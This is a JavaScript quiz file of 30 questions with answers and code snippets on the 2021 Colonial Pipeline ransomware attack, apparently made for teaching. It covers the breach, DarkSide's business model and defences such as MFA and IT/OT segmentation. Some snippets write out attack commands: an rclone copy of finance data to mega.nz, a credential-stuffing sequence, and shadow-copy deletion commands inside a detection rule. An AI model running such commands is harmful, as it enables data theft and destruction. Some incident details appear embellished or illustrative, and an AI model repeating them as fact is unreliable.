// topic8_questions.js
// 30 Comprehensive Questions on Case Study 8: Colonial Pipeline Ransomware Incident (2021) - Critical Infrastructure Shutdown

const questions = [
  {
    id: 1,
    question: "Why was the May 2021 Colonial Pipeline ransomware incident a watershed moment in critical energy infrastructure security?",
    shortAnswer: "It was the largest cyber-physical disruption of oil and refined petroleum transport in American history, leading to widespread panic buying, fuel shortages across the US East Coast, and a declared federal state of emergency.",
    explanation: "Colonial Pipeline operates the 5,500-mile pipeline system carrying ~45% of all gasoline, diesel, and jet fuel consumed on the US East Coast (2.5 million barrels per day). When ransomware hit its corporate IT billing network on May 7, 2021, management proactively halted all physical pipeline operations for 6 days out of fear that the malware could cross into the Operational Technology (OT) pumping systems.",
    hint: "The largest cyber disruption of US fuel infrastructure carrying 45% of East Coast petroleum.",
    level: "Moderate",
    codeExample: `// Colonial Pipeline System Profile:
const colonialPipelineStats = {
  pipelineLengthMiles: 5500,
  dailyCapacityBarrels: 2500000,
  eastCoastFuelShare: "45% of all gasoline, diesel, and jet fuel",
  physicalShutdownDurationDays: 6,
  ransomwareFamily: "DarkSide Ransomware-as-a-Service (RaaS)"
};`
  },
  {
    id: 2,
    question: "What specific single point of failure enabled the DarkSide ransomware operators to breach Colonial Pipeline's network?",
    shortAnswer: "A single inactive, legacy Virtual Private Network (VPN) account that lacked Multi-Factor Authentication (MFA), using a password leaked in a prior dark web data breach.",
    explanation: "Forensic investigators (Mandiant) discovered that the attackers gained initial access through an orphaned VPN profile on an older Microsoft Remote Desktop gateway. The account belonged to an employee, but was no longer actively needed. Because the VPN gateway did not enforce Multi-Factor Authentication (MFA), the attackers authenticated using a recycled plaintext password discovered in a dark web leak.",
    hint: "An orphaned, legacy VPN account without MFA using a leaked dark web password.",
    level: "Moderate",
    codeExample: `// Ingress Forensic Indicator:
const initialAccessVector = {
  gatewayType: "Legacy Pulse Secure / Microsoft VPN Gateway",
  credentialOrigin: "Dark web credential dump (DeHashed / BreachCompilation)",
  mfaStatus: "DISABLED / NOT CONFIGURED",
  accountType: "Inactive employee profile with persistent Active Directory access"
};`
  },
  {
    id: 3,
    question: "Which criminal cybercrime group developed the DarkSide ransomware, and what was their operational model?",
    shortAnswer: "DarkSide, an Eastern European Ransomware-as-a-Service (RaaS) criminal syndicate operating under a double-extortion business model.",
    explanation: "DarkSide operated as a franchise: core developers maintained the malware and Tor leak site, while freelance 'affiliates' conducted intrusions and split ransom proceeds (typically 75-85% to the affiliate, 15-25% to core developers). They practiced double-extortion: stealing 100 GB of sensitive business files before encrypting local servers.",
    hint: "DarkSide Ransomware-as-a-Service (RaaS) operating a double-extortion affiliate model.",
    level: "Moderate",
    codeExample: `// DarkSide Double-Extortion Business Model:
// Step 1: Exfiltrate 100 GB of confidential accounting & financial data (Threaten to publish)
// Step 2: Encrypt virtual machines and shared storage using Salsa20 / RSA-1024
// Step 3: Demand ransom payment in Bitcoin or Monero via dark web Tor portal`
  },
  {
    id: 4,
    question: "Why did Colonial Pipeline management decide to shut down the physical pipeline operations even though the OT pumping network was not infected?",
    shortAnswer: "Because the corporate IT billing and accounting systems were encrypted, leaving the company unable to track fuel deliveries, calculate billing, or guarantee safe operational separation from the OT grid.",
    explanation: "Colonial Pipeline's physical supervisory control (OT/SCADA) network was actually uninfected. However, because their IT billing and volumetric tracking software was encrypted, Colonial had no way to track how much fuel customers were receiving or bill them. Furthermore, leadership feared malware might cross from the flat corporate IT network into the pipeline's industrial SCADA controllers.",
    hint: "Inability to track fuel billing and volumetric dispatch, combined with fear of IT-to-OT malware spillover.",
    level: "Expert",
    codeExample: `// IT vs OT Operational Interdependency:
const interdependencyFailure = {
  itNetworkStatus: "ENCRYPTED: Billing, ERP, Volumetric meters, Invoicing offline",
  otNetworkStatus: "HEALTHY (SCADA pumps running normally)",
  businessDecision: "HALT PHYSICAL PIPELINE: Cannot operate commercially without billing software!"
};`
  },
  {
    id: 5,
    question: "How much ransom did Colonial Pipeline CEO Joseph Blount pay to the DarkSide ransomware group, and in what currency?",
    shortAnswer: "$4.4 Million (approximately 75 Bitcoin at the time, equivalent to ~₹36.5 Crores).",
    explanation: "Facing catastrophic economic pressure, fuel shortages at airports, and uncertainty about recovery timelines, CEO Joseph Blount authorized the payment of 75 Bitcoin ($4.4 Million) on May 8, 2021 (the day after the attack). The attackers provided a decryptor tool, but it operated so slowly that Colonial continued restoring primarily from business backups.",
    hint: "75 Bitcoin ($4.4 Million / ~₹36.5 Crores) paid to receive a sluggish decryption tool.",
    level: "Moderate",
    codeExample: `// Ransom Transaction Record:
const ransomPayment = {
  amountBTC: 75.0,
  amountUSD: 4400000,
  amountINR: 365000000, // ~₹36.5 Crores
  paymentDate: "May 8, 2021",
  decryptorPerformance: "Extremely slow; IT engineers relied on backups to rebuild servers"
};`
  },
  {
    id: 6,
    question: "How did the United States Department of Justice and FBI miraculously recover a majority of the ransom payment a month later?",
    shortAnswer: "The FBI tracked the Bitcoin blockchain transactions and executed a federal search warrant to seize the private cryptographic key of the attackers' custodial Bitcoin wallet containing 63.7 BTC.",
    explanation: "On June 7, 2021, Deputy Attorney General Lisa Monaco announced that the FBI's Ransomware and Digital Extortion Task Force had traced the flow of Bitcoin across public ledgers to a specific cryptocurrency wallet. Armed with a judicial search warrant, the FBI obtained the private key to the wallet and recovered 63.7 Bitcoin (worth ~$2.3 Million at the time of seizure).",
    hint: "The FBI traced blockchain transactions and seized the private key to the attackers' Bitcoin wallet.",
    level: "Moderate",
    codeExample: `// FBI Cryptocurrency Seizure Affidavit:
const fbiRecoveryDetails = {
  initialRansomBTC: 75.0,
  recoveredBTC: 63.7, // ~85% of affiliate share
  recoveryValueUSD: 2300000,
  seizureMethod: "Federal Search Warrant (US District Court for Northern District of California)",
  cryptographicBasis: "FBI gained possession of private key to Bitcoin wallet `1Mt8nv...`"
};`
  },
  {
    id: 7,
    question: "What regulatory mandates were issued by the US Transportation Security Administration (TSA) following the Colonial Pipeline breach?",
    shortAnswer: "Mandatory TSA Security Directives (SD Pipeline-2021-01 and SD Pipeline-2021-02) requiring pipeline operators to designate CISOs, report cyber incidents within 12 hours, and implement strict IT/OT network segmentation.",
    explanation: "Prior to 2021, pipeline cybersecurity guidelines were largely voluntary. The crisis prompted the TSA to issue binding emergency directives requiring all critical pipeline owners to: 1. Report incidents to CISA within 12 hours; 2. Designate a 24/7 Cybersecurity Coordinator; 3. Enforce MFA on all access points; 4. Conduct mandatory architecture reviews and test manual failover plans.",
    hint: "Binding TSA Security Directives mandating 12-hour incident reporting, universal MFA, and IT/OT isolation.",
    level: "Moderate",
    codeExample: `// TSA Security Directive (SD Pipeline-2021-02) Core Requirements:
const tsaPipelineMandate = {
  incidentReporting: "Mandatory notification to CISA within 12 hours of discovery",
  cybersecurityCoordinator: "Designate 24/7 primary and alternate points of contact",
  identityControls: "Mandatory Multi-Factor Authentication (MFA) on all network entry points",
  architectureReview: "Annual comprehensive third-party architecture review and penetration testing",
  manualFailoverTesting: "Regular testing of manual mechanical operational capabilities"
};`
  },
  {
    id: 8,
    question: "What is 'IT/OT Interdependency Risk' and how did Colonial Pipeline illustrate this systemic design vulnerability?",
    shortAnswer: "The dangerous operational coupling where a failure or disruption in commercial enterprise IT systems forces the shutdown of physically functional industrial OT systems.",
    explanation: "Even when an industrial control network (SCADA) is physically secure and uninfected, tight coupling with IT systems (enterprise resource planning, ticketing, billing, SCADA telemetry bridges) creates an operational dependency. If IT goes down, management cannot safely track volumetric deliveries or generate bills, causing the physical plant to stop.",
    hint: "Tight coupling where IT system failures force the shutdown of healthy physical SCADA systems.",
    level: "Expert",
    codeExample: `// IT/OT Interdependency Decoupling Architecture:
// INSECURE (Colonial 2021): SCADA Pumps cannot run if ERP Billing is offline -> GRID STOPS!
// RESILIENT (Modern): SCADA maintains autonomous local storage buffers to pump fuel safely for 14 days without corporate IT billing connectivity.`
  },
  {
    id: 9,
    question: "What encryption algorithms did DarkSide ransomware employ to lock enterprise storage?",
    shortAnswer: "Salsa20 (or ChaCha20) for symmetric high-speed file encryption, combined with RSA-1024 (or RSA-2048) public key wrapping for the session keys.",
    explanation: "To encrypt terabytes of data across virtual machines and storage arrays quickly, DarkSide utilized the fast Salsa20 stream cipher with multi-threading. The unique Salsa20 key generated for each file was encrypted with the attacker's embedded master public RSA key and appended to the end of the encrypted file.",
    hint: "Salsa20 stream cipher for files, wrapped with master RSA public keys.",
    level: "Expert",
    codeExample: `// DarkSide Symmetric / Asymmetric Hybrid Encryption:
void EncryptFileHybrid(const char* filePath, RSA* masterPublicKey) {
    BYTE salsa20Key[32];
    GenerateRandomKey(salsa20Key, 32);
    // Encrypt file content rapidly with Salsa20 stream cipher:
    Salsa20_EncryptFile(filePath, salsa20Key);
    // Encrypt Salsa20 key with RSA master public key:
    BYTE encryptedKey[256];
    RSA_public_encrypt(32, salsa20Key, encryptedKey, masterPublicKey, RSA_PKCS1_PADDING);
    // Append encrypted key to file footer
    AppendKeyToFileFooter(filePath, encryptedKey, 256);
}`
  },
  {
    id: 10,
    question: "What is 'Dark Web Credential Stuffing' and how was Colonial's VPN password originally compromised?",
    shortAnswer: "Automated testing of billions of username/password pairs stolen from previous unrelated third-party breaches against corporate remote access gateways.",
    explanation: "The employee whose account was compromised had reused their corporate password on an unrelated external website that suffered a data breach years earlier. Threat intelligence actors scraped these dark web breach compilations (e.g. Collection #1, RockYou2021) and fed them into automated credential stuffing tools that successfully authenticated against Colonial's unprotected VPN.",
    hint: "Reusing corporate passwords on external sites exposed in prior dark web dumps.",
    level: "Moderate",
    codeExample: `// Credential Stuffing Attack Sequence:
// 1. Attacker queries dark web database: "email: employee@colonialpipeline.com"
// 2. Discovers leaked hash from 2018 LinkedIn breach: "Summer2018!"
// 3. Tests "employee@colonialpipeline.com : Summer2018!" against https://vpn.colonialpipeline.com
// 4. Single-factor VPN accepts password -> Attacker gains internal LAN shell!`
  },
  {
    id: 11,
    question: "What consumer behavioral phenomenon exacerbated the East Coast gasoline shortages following the shutdown announcement?",
    shortAnswer: "Mass psychological 'Panic Buying' and hoarding, which artificially drained regional gas stations in hours, long before physical supply buffers were exhausted.",
    explanation: "When news leaked that the pipeline was closed, millions of motorists rushed to gas stations across Virginia, North Carolina, Georgia, and Florida to fill cars and plastic containers. Demand spiked by over 400% in 48 hours, causing gas stations to run completely dry despite emergency gasoline stockpiles existing in regional storage terminals.",
    hint: "Panic buying and hoarding caused artificial demand spikes of 400% in 48 hours.",
    level: "Moderate",
    codeExample: `// Supply vs Panic Demand Dynamics:
const panicDemandModel = {
  normalDailyGasolineDemandGallons: 100000000,
  panicPeakDemandGallons: 400000000, // 400% surge
  result: "71% of all gas stations in North Carolina and 55% in Virginia were empty within 72 hours"
};`
  },
  {
    id: 12,
    question: "What is 'Air-Gapped Decoupling' between IT Billing and SCADA Volumetric Dispatch?",
    shortAnswer: "Designing industrial SCADA pumping operations to run autonomously in an isolated 'Islanding' mode with local logging buffers, independent of enterprise billing systems.",
    explanation: "In an air-gapped decoupled architecture, SCADA flow computers log volumetric output to local tamper-evident solid-state buffers. Even if corporate SAP or Oracle ERP billing servers are completely destroyed by ransomware, the physical pipeline continues pumping oil safely for up to 30 days while buffered metrics await batch ingestion.",
    hint: "Allowing SCADA pumping to run in autonomous islanding mode without corporate ERP servers.",
    level: "Expert",
    codeExample: `// Autonomous OT Islanding Mode Architecture:
const otAutonomousMode = {
  itConnectionStatus: "OFFLINE / ENCRYPTED",
  otPumpingStatus: "CONTINUOUS_NORMAL",
  volumetricLogging: "Buffered to local redundant flash storage (30-day capacity)",
  safetyInterlocks: "Hardwired analog pressure sensors operate independently"
};`
  },
  {
    id: 13,
    question: "What is 'Double-Extortion Ransomware' and how did DarkSide execute data exfiltration before encryption?",
    shortAnswer: "Exfiltrating sensitive proprietary corporate data to attacker servers before detonating the ransomware, threatening to publish the leaked data if the decryption ransom is not paid.",
    explanation: "If a company has excellent offline backups and refuses to pay for a decryption key, double-extortion forces payment by threatening public exposure of trade secrets, employee records, and regulatory non-compliance. DarkSide exfiltrated ~100 GB of Colonial's accounting data via mega.nz cloud storage before encrypting endpoints.",
    hint: "Stealing sensitive corporate data to threaten public leaks even if backups exist.",
    level: "Moderate",
    codeExample: `// Double Extortion Pipeline:
// Phase 1: Recon & Exfiltration -> rclone.exe copy C:\\Finance mega.nz:/Colonial_Dump/
// Phase 2: Mass Encryption -> darkside.exe -path C:\\ -threads 32
// Phase 3: Extortion Notice -> "Pay 75 BTC for decryptor AND non-disclosure agreement"`
  },
  {
    id: 14,
    question: "What is 'Privileged Identity Governance' and how does it eliminate orphaned, inactive VPN accounts?",
    shortAnswer: "Automated identity lifecycle management that immediately revokes VPN profiles and Active Directory accounts when an employee leaves, changes roles, or remains inactive for 30 days.",
    explanation: "Colonial's breach occurred because an old VPN profile remained active long after the employee stopped using it. Identity Governance and Administration (IGA) solutions (e.g. SailPoint, Microsoft Entra ID Governance) automatically detect dormant accounts and revoke access tokens after 30-90 days of inactivity.",
    hint: "Automated de-provisioning of dormant VPN accounts inactive for 30+ days.",
    level: "Moderate",
    codeExample: `// PowerShell Dormant VPN Account Cleanup Script:
/*
$dormantCutoff = (Get-Date).AddDays(-30)
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | 
  Where-Object {$_.LastLogonDate -lt $dormantCutoff -and $_.MemberOf -like "*VPN_Users*"} | 
  Disable-ADAccount
# Automatically disables orphaned VPN accounts before adversaries can exploit them!
*/`
  },
  {
    id: 15,
    question: "How did the DarkSide criminal group react publicly to the massive geopolitical backlash caused by the Colonial Pipeline shutdown?",
    shortAnswer: "They issued a public apology claiming they were 'apolitical' and only wanted money, subsequently shutting down operations after their servers and Bitcoin funds were seized.",
    explanation: "On May 10, 2021, DarkSide posted a statement on their dark web portal: 'We are apolitical, we do not participate in geopolitics... Our goal is to make money, and not creating problems for society.' Facing global law enforcement mobilization, their public servers went dark within days, and core members rebranded as 'BlackMatter'.",
    hint: "Issued a public statement claiming they were apolitical, before their infrastructure collapsed.",
    level: "Moderate",
    codeExample: `// DarkSide Public Statement Excerpt (May 10, 2021):
/*
"We are apolitical. We do not participate in geopolitics, do not need to tie us with a defined government.
Our goal is to make money and not creating problems for society.
From today we introduce moderation and check each company that our partners want to encrypt to avoid social consequences in the future."
*/`
  },
  {
    id: 16,
    question: "What is 'Ransomware-as-a-Service' (RaaS) and what are the roles of 'Core Developers' vs 'Affiliates'?",
    shortAnswer: "A franchise business model where core malware authors write the encryption software and host infrastructure, while independent criminal affiliates execute intrusions and split ransom payments.",
    explanation: "RaaS democratized cybercrime. Core developers do not hack victim networks; they provide weaponized ransomware payloads and negotiation portals. Affiliates (penetration testers turned criminals) conduct the actual spear-phishing, credential stuffing, and lateral movement, typically receiving 75-85% of every ransom paid.",
    hint: "A franchise model where authors create ransomware and affiliates conduct the hacking.",
    level: "Moderate",
    codeExample: `// RaaS Revenue Sharing Model:
const raasRevenueSplit = {
  totalRansomPaidBTC: 75.0,
  affiliateSharePercentage: 85, // 63.75 BTC (Intrusion Operator)
  developerSharePercentage: 15, // 11.25 BTC (DarkSide Platform Creator)
  escrowMechanism: "Automated Bitcoin multi-signature smart contract on dark web portal"
};`
  },
  {
    id: 17,
    question: "What is 'Hardware FIDO2 Multi-Factor Authentication' and why does it render stolen dark web passwords completely useless?",
    shortAnswer: "A cryptographic authentication standard using physical hardware security keys (e.g. YubiKeys) that require a physical human touch and cryptographic domain binding.",
    explanation: "Unlike SMS codes or push notifications (which can be intercepted or bypassed with MFA fatigue), FIDO2/WebAuthn hardware keys use public-key cryptography bound to the specific domain URL. Even if an attacker possesses the exact plaintext password from the dark web, they cannot log into the VPN without physically touching the victim's hardware key.",
    hint: "Physical hardware security keys bound to the domain preventing any password reuse attack.",
    level: "Moderate",
    codeExample: `// FIDO2 Hardware Challenge Verification:
const fido2Auth = {
  credentialCheck: "Password accepted",
  hardwareChallenge: "FIDO2 WebAuthn cryptographic assertion",
  userPresence: "Physical capacitive touch on YubiKey hardware sensor REQUIRED",
  result: "Attacker on dark web CANNOT satisfy physical hardware assertion -> ACCESS DENIED"
};`
  },
  {
    id: 18,
    question: "Why was the decryptor tool provided by DarkSide following the $4.4M payment largely abandoned by Colonial's IT engineers?",
    shortAnswer: "The decryptor was notoriously slow, inefficient, and crashed frequently on large multi-terabyte virtual machine disks, making bare-metal restoration from backups much faster.",
    explanation: "Ransomware encryption is optimized for raw write speed (using multi-threaded Salsa20), but attacker-supplied decryption tools are notoriously poorly coded. The DarkSide decryptor processed data at a crawl and frequently corrupted database files. Colonial's engineers realized it was faster to restore clean server images from offline snapshots.",
    hint: "The decryptor was poorly written, extremely slow, and crashed on large server disks.",
    level: "Moderate",
    codeExample: `// Decryptor vs Backup Restore Performance:
const recoveryBenchmark = {
  darksideDecryptorSpeed: "~50 MB / minute (Frequent memory leaks and crashes)",
  bareMetalBackupRestoreSpeed: "~1,500 MB / minute (Clean gigabit enterprise SAN restore)",
  decision: "Abandoned attacker decryptor in favor of enterprise bare-metal backup rebuild"
};`
  },
  {
    id: 19,
    question: "What is 'Micro-segmentation' between IT Enterprise Networks and OT Pipeline Pumping Networks?",
    shortAnswer: "Enforcing strict unidirectional data diodes or stateful industrial firewalls that block all IT traffic from directly reaching programmable logic controllers (PLCs) and SCADA systems.",
    explanation: "A pipeline's industrial control network (OT) should never share an Active Directory domain or routing subnet with corporate accounting. A demilitarized zone (DMZ) with industrial firewalls ensures that even if every computer in corporate IT is encrypted, the OT pumping subnets remain completely isolated.",
    hint: "Industrial firewalls and data diodes preventing IT malware from jumping into SCADA controllers.",
    level: "Moderate",
    codeExample: `// Purdue Model IT/OT Segmentation Gateway:
// Zone 4 (Corporate IT / Billing) ---> FIREWALL DMZ (Zone 3.5) -x- CANNOT ROUTE DIRECTLY TO Zone 3 (SCADA Master)`
  },
  {
    id: 20,
    question: "How does the Indian National Critical Information Infrastructure Protection Centre (NCIIPC) categorize oil and gas pipelines in India?",
    shortAnswer: "As 'Critical Information Infrastructure' (CII) under Section 70 of the Information Technology Act 2000, mandating strict cybersecurity frameworks, 24/7 SOC monitoring, and CERT-In compliance.",
    explanation: "Under Indian law, energy pipelines (e.g. Indian Oil, Bharat Petroleum, GAIL) carrying petroleum across West Bengal, Barrackpore, Kolkata, and nationwide are designated Critical Information Infrastructure. Any unauthorized access carries statutory prison terms up to 10 years and mandatory compliance with NCIIPC/CEA guidelines.",
    hint: "Designated as Critical Information Infrastructure (CII) under Section 70 of the IT Act 2000.",
    level: "Moderate",
    codeExample: `// Indian IT Act 2000 (Section 70) CII Compliance:
const nciipcOilGasRegulation = {
  designation: "Critical Information Infrastructure (CII) - Energy Sector",
  governingBody: "NCIIPC & CERT-In",
  penalties: "Rigorous imprisonment up to 10 years for unauthorized access to pipeline control networks"
};`
  },
  {
    id: 21,
    question: "What is 'CISA Ransomware Readiness Assessment' (RRA) and what are its core modules?",
    shortAnswer: "A self-assessment security evaluation framework covering Asset Management, Identity Management, Network Architecture, Backup Management, and Incident Response.",
    explanation: "Developed in the wake of the Colonial Pipeline and JBS attacks, CISA's RRA provides critical infrastructure operators with a structured methodology to benchmark their resilience against double-extortion ransomware gangs.",
    hint: "A standardized CISA assessment evaluating enterprise resilience against ransomware.",
    level: "Moderate",
    codeExample: `// CISA RRA Evaluation Pillars:
const rraPillars = [
  "1. Robust Multi-Factor Authentication & Identity Governance",
  "2. Immutable Air-Gapped / WORM Backup Architecture",
  "3. Zero Trust IT/OT Network Segmentation",
  "4. Endpoint Detection & Response (EDR) with 24/7 SOC Monitoring",
  "5. Tested Incident Response & Manual Operational Continuity Plans"
];`
  },
  {
    id: 22,
    question: "What is 'Lateral Movement Detection' and how could EDR have caught DarkSide inside Colonial's IT network?",
    shortAnswer: "By alerting on the abuse of native administrative tools (`PsExec.exe`, `wmic.exe`, `vssadmin.exe`) and unexpected PowerShell port scanning across internal subnets.",
    explanation: "DarkSide did not detonate ransomware immediately. For several days, the affiliate moved laterally using Cobalt Strike, dumped passwords with Mimikatz, and deleted shadow copies (`vssadmin delete shadows /all`). An active Endpoint Detection & Response (EDR) agent would have intercepted these behaviors and isolated the hosts.",
    hint: "Flagging anomalous PsExec, WMIC, and vssadmin shadow copy deletion commands.",
    level: "Expert",
    codeExample: `// Sigma Rule for DarkSide Lateral Movement & Shadow Deletion:
/*
title: DarkSide Ransomware Shadow Copy Deletion
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows /all /quiet'
      - 'wmic shadowcopy delete'
      - 'bcdedit /set {default} recoveryenabled No'
  condition: selection
# Triggers IMMEDIATE host network isolation!
*/`
  },
  {
    id: 23,
    question: "What role does 'Cyber Incident Disclosure Timing' play in national critical infrastructure emergency response?",
    shortAnswer: "Rapid 12 to 24-hour mandatory disclosure allows federal agencies (CISA, FBI, CERT-In) to coordinate emergency fuel logistics, issue intelligence alerts, and initiate blockchain asset recovery.",
    explanation: "Colonial's rapid disclosure allowed the FBI to begin tracing Bitcoin blockchain transactions within hours of payment, directly enabling the recovery of 63.7 BTC a month later. TSA's subsequent regulations codified mandatory 12-hour reporting.",
    hint: "Enables rapid federal assistance, emergency logistics coordination, and blockchain tracing.",
    level: "Moderate",
    codeExample: `// Critical Incident Escalation Timeline:
// Hour 0: Ransomware detected on IT network
// Hour 1: Management proactively isolates physical pipeline
// Hour 6: FBI Ransomware Task Force engaged -> Tracing wallet begins
// Hour 12: Mandatory CISA / TSA regulatory incident report filed`
  },
  {
    id: 24,
    question: "What is 'Blockchain Forensics' and how do tools like Chainalysis and Elliptic trace ransomware ransoms?",
    shortAnswer: "Analyzing the immutable public Bitcoin ledger to track the movement of funds through mixer services, hops, and deposit addresses associated with centralized cryptocurrency exchanges.",
    explanation: "Bitcoin is pseudonymous, not anonymous. Every transaction is permanently recorded on the public blockchain. Blockchain analytics tools cluster addresses and trace the 75 BTC through various wallet hops until it arrived at an unhosted wallet where law enforcement was able to seize the private key.",
    hint: "Analyzing the public blockchain ledger to trace transaction hops and identify wallet clusters.",
    level: "Moderate",
    codeExample: `// Blockchain Transaction Hop Trace:
// Colonial Payment (75 BTC) ---> Transaction TX_849A...
// Split 1: 11.25 BTC to DarkSide Core Developer Wallet
// Split 2: 63.75 BTC to Affiliate Wallet (Address: 1Mt8nv...) -> FBI Seizure Executed!`
  },
  {
    id: 25,
    question: "Why is 'Tabletop Crisis Simulation' (Wargaming) essential for executive leadership in critical infrastructure companies?",
    shortAnswer: "It forces CEOs, legal counsel, and engineering chiefs to practice making high-stakes decisions (e.g. physical plant shutdown, ransom payment, public disclosure) before a real crisis hits.",
    explanation: "Colonial's CEO had to decide whether to shut down the East Coast's fuel lifeline in minutes under extreme duress. Regular tabletop exercises allow leadership to pre-define threshold criteria for IT/OT isolation, establish out-of-band communications, and rehearse manual operational continuity.",
    hint: "Pre-defining threshold criteria for operational shutdowns and practicing crisis governance.",
    level: "Moderate",
    codeExample: `// Executive Tabletop Scenario Module:
const crisisTabletopScenario = {
  exerciseTitle: "Project BlackFlow: Pipeline IT Ransomware Spillover",
  participants: ["CEO", "CISO", "General Counsel", "Head of SCADA Operations", "PR Lead"],
  coreQuestions: [
    "1. At what exact technical indicator do we halt physical pumping operations?",
    "2. How long can local tank farms buffer fuel delivery without active IT billing?",
    "3. What is our legally binding regulatory notification window to CERT-In / CISA?"
  ]
};`
  },
  {
    id: 26,
    question: "What is 'Data Loss Prevention' (DLP) egress monitoring and how could it have detected the 100 GB exfiltration?",
    shortAnswer: "Network sensors monitoring outbound data volumes and flagging abnormal multi-gigabyte uploads to commercial file-sharing services (`mega.nz`, `dropbox.com`).",
    explanation: "Before encrypting the network, the DarkSide affiliate spent hours uploading 100 GB of financial records. A DLP solution configured with bandwidth anomaly thresholds or egress cloud service blocks would have terminated the connection the moment mega.nz traffic was initiated.",
    hint: "Flagging abnormal multi-gigabyte data uploads to external cloud storage providers.",
    level: "Moderate",
    codeExample: `// DLP Outbound Cloud Storage Block Rule:
/*
Rule: BLOCK_UNAUTHORIZED_CLOUD_EXFIL
Destination_Categories: [Cloud Storage, File Sharing, mega.nz, anonfiles]
Source: INTERNAL_CORPORATE_LAN
Action: DROP & ALERT_SOC
*/`
  },
  {
    id: 27,
    question: "How did the Colonial Pipeline incident impact the global 'Cyber Insurance' market for critical infrastructure?",
    shortAnswer: "Insurers increased cyber insurance premiums by 50-100%, mandated proof of universal MFA and immutable backups as strict conditions for coverage, and capped ransomware payout limits.",
    explanation: "Following 2021, insurance underwriters realized critical infrastructure shutdowns generate catastrophic systemic liability. Insurers no longer write policies without verified technical audits proving hardware MFA, endpoint EDR deployment, and regular offline backup restoration tests.",
    hint: "Doubling premiums, capping payouts, and mandating verified proof of MFA and immutable backups.",
    level: "Moderate",
    codeExample: `// Modern Cyber Underwriting Warranty Requirements:
const insurancePrerequisites = [
  "100% MFA Enforcement on all remote access and administrative portals",
  "Immutable, air-gapped backups tested within the last 90 days",
  "24/7 Managed Endpoint Detection and Response (EDR / XDR)",
  "Documented IT/OT network segmentation architecture"
];`
  },
  {
    id: 28,
    question: "What is 'Volumetric Meter Buffering' and how does it enable oil refineries to pump fuel without active enterprise billing servers?",
    shortAnswer: "Storing flow meter calibration records and delivery batches in secure local RTU memory at delivery terminals, synchronizing with billing servers once IT is restored.",
    explanation: "Modern pipeline design separates physical fluid transport from financial billing. Flow computers at delivery rack terminals record truck loading tickets locally in encrypted tamper-proof flash memory, allowing tanker trucks to continue loading fuel during a corporate billing IT outage.",
    hint: "Recording fuel dispatch tickets locally in terminal flow computers during IT outages.",
    level: "Expert",
    codeExample: `// Flow Computer Terminal Islanding Configuration:
const terminalFlowComputer = {
  mode: "OFFLINE_LOCAL_DISPATCH",
  localTicketStorage: "Encrypted NVRAM (Holds up to 50,000 truck loading transactions)",
  batchSync: "Uploads transaction logs to SAP ERP once IT network is sanitized and restored"
};`
  },
  {
    id: 29,
    question: "How does the Indian DPDP Act 2023 penalize energy utilities that suffer massive PII and employee financial data leaks during double-extortion ransomware attacks?",
    shortAnswer: "The Data Protection Board of India can impose statutory penalties up to ₹250 Crores for failure to implement reasonable security safeguards like MFA on remote access portals.",
    explanation: "Allowing an orphaned VPN account without MFA to exist on an internet-facing gateway is considered gross failure of reasonable technical safeguards. When 100 GB of corporate and employee PII is exfiltrated and leaked, entities in West Bengal and across India face maximum statutory penalties.",
    hint: "Penalties up to ₹250 Crores under DPDP 2023 for failure to enforce reasonable security safeguards.",
    level: "Moderate",
    codeExample: `// DPDP 2023 Statutory Liability Assessment:
const dpdpLiability = {
  statute: "Section 8(5) - Duty to Implement Reasonable Technical Safeguards",
  finding: "Failure to enforce Multi-Factor Authentication on remote access VPN gateway",
  maximumStatutoryPenaltyINR: 2500000000 // ₹250 Crores
};`
  },
  {
    id: 30,
    question: "What ultimate architectural lesson must engineering and cybersecurity students in Barrackpore and Kolkata remember from the Colonial Pipeline incident?",
    shortAnswer: "A single forgotten password without MFA can shut down a nation's energy supply; security demands universal MFA, complete identity lifecycle governance, and decoupling physical OT operations from corporate IT billing.",
    explanation: "Colonial Pipeline demonstrated that the boundary between cyber security and physical national survival is razor-thin. True critical infrastructure resilience requires eliminating all single-factor access, continuously auditing dormant accounts, enforcing hardware MFA, and engineering physical industrial systems to operate safely even when corporate IT is entirely destroyed.",
    hint: "Universal MFA, identity lifecycle governance, and decoupling physical OT from corporate IT.",
    level: "Moderate",
    codeExample: `// The Colonial Pipeline Post-Mortem Defense Formula:
// National Grid Resilience = (Universal Hardware MFA) + (Automated Identity Lifecycle) + (Decoupled Autonomous OT Islanding)`
  }
];

export default questions;
